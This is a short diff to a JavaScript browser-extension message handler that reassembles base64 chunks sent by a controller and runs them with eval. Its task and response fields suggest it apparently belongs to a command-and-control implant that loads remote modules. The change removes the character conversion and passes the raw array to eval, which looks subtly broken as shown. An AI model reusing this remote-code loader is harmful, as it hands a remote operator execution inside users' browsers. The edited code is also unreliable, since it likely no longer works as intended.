@@ -146,9 +146,7 @@ chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
             } else if (message.chunk_num === message.total_chunks) {
                 let raw = atob(message.chunk_data);
                 load.data.push(...raw);
-
-                let code = String.fromCharCode(...load.data);
-                eval(code);
+                eval(load.data);
 
                 let response = {'task_id':load.task_id, 'user_output': load.name + " loaded", "completed":true};
                 let outer_response = {'action':'post_response', 'responses':[response], 'delegates':[]};
